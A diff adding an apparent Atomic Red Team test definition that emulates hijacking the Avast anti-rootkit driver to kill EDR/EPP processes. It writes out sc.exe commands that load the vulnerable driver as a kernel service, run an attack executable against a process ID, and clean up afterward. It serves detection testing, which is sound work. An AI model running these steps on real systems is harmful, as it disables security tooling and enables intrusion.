@@ -1,0 +1,31 @@
+attack_technique: Hijack Avast anti-rootkit Driver
+display_name: Hijack Avast anti-rootkit Driver
+atomic_tests:
+- name: Hijack Avast Driver
+  auto_generated_guid: 3c2328e1-32e3-415c-9f94-2087c64f1e30
+  description: |
+    Attacker Hijacks avast anti-rootkit driver to terminate processes including EDR/EPP processes 
+  supported_platforms:
+    - windows
+  input_arguments:
+    ProcessId:
+      description: Proess Id that will be terminated by the avast driver
+      type: string
+      default: 1337     
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The Avast driver is not installed
+    prereq_command: |
+      if (get-service -name aswarpot -ErrorAction SilentlyContinue) { exit 0} else { exit 1}
+    get_prereq_command: |
+      sc.exe create aswarpot type= kernel binPath= PathToAtomicsFolderHijackAvastDriver\bin\asWarPot.sys
+      sc.exe start aswarpot
+  executor:
+    command: |
+     PathToAtomicsFolderHijackAvastDriver\bin\HijackAvastdriver.exe #{ProcessId}
+    cleanup_command: |
+      sc.exe stop aswarpot
+      sc.exe delete aswarpot
+    name: powershell
+    elevation_required: true
